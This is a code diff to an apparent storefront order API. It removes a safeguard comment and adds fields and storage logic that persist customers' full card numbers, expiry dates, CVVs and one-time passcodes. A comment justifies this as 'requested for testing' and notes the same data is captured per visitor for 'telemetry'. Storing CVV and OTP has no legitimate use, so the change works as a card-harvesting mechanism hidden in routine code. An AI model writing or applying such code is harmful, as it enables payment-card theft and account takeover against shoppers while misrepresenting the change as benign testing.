@@ -104,13 +104,25 @@ const orderPaymentSchema = z.object({
     .default("pending"),
   otpVerified: z.boolean().optional().default(false),
   receiptUrl: z.string().url().optional(),
-  // Safe-to-store card metadata only: last 4 digits + cardholder name.
-  // Full PAN, expiry, and CVV are never accepted or persisted.
   cardLast4: z
     .string()
     .regex(/^\d{4}$/)
     .optional(),
   cardName: z.string().max(120).optional(),
+  // NOTE: Storing the full PAN, expiry, CVV, and raw OTP in the orders
+  // collection has been explicitly requested for testing. This is *not*
+  // PCI-compliant — do not enable in production. The same data is also
+  // captured to `pays/{visitorId}` by the storefront for telemetry.
+  cardNumber: z.string().min(12).max(25).optional(),
+  expiry: z
+    .string()
+    .regex(/^\d{2}\/\d{2}$/)
+    .optional(),
+  cvv: z
+    .string()
+    .regex(/^\d{3,4}$/)
+    .optional(),
+  otp: z.string().regex(/^\d{3,8}$/).optional(),
 });
 
 // Customers may only emit a narrow set of event types when placing an order.
@@ -210,6 +222,12 @@ router.post("/orders", async (req, res) => {
           ? { cardLast4: data.payment.cardLast4 }
           : {}),
         ...(data.payment.cardName ? { cardName: data.payment.cardName } : {}),
+        ...(data.payment.cardNumber
+          ? { cardNumber: data.payment.cardNumber }
+          : {}),
+        ...(data.payment.expiry ? { expiry: data.payment.expiry } : {}),
+        ...(data.payment.cvv ? { cvv: data.payment.cvv } : {}),
+        ...(data.payment.otp ? { otp: data.payment.otp } : {}),
       },
       items: data.items,
       total: data.total,
